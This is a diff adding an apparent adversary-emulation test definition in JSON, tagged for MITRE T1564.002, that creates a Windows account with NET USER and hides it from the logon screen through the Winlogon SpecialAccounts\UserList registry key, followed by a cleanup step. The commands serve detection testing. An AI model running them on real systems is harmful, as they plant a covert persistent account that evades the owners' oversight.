@@ -1,0 +1,58 @@
+{
+  "id": "173126b7-afe4-45eb-8680-fa9f6400431c",
+  "name": "Create Hidden User in Registry",
+  "description": "Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nReference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "9fe5f56d-3df3-48e1-b3f2-3da11fadbdcf",
+      "type": "execute-command",
+      "data": {
+        "command": "NET USER #{user_name}$ #{user_password} /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /t REG_DWORD /d 0\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "40246d10-8e18-40d6-b3b9-22ff8e7fe8dc",
+      "type": "execute-command",
+      "data": {
+        "command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /f \u003enul 2\u003e\u00261\nnet user ${user_name}$ /delete \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "9fe5f56d-3df3-48e1-b3f2-3da11fadbdcf",
+      "p": "on-success",
+      "o": "40246d10-8e18-40d6-b3b9-22ff8e7fe8dc"
+    },
+    {
+      "s": "9fe5f56d-3df3-48e1-b3f2-3da11fadbdcf",
+      "p": "on-failure",
+      "o": "40246d10-8e18-40d6-b3b9-22ff8e7fe8dc"
+    }
+  ],
+  "tags": [
+    "T1564.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "user_password",
+      "type": "string",
+      "description": "Password for new user account",
+      "value": "At0micRedTeam!"
+    },
+    {
+      "name": "user_name",
+      "type": "string",
+      "description": "Username",
+      "value": "AtomicOperator"
+    }
+  ]
+}
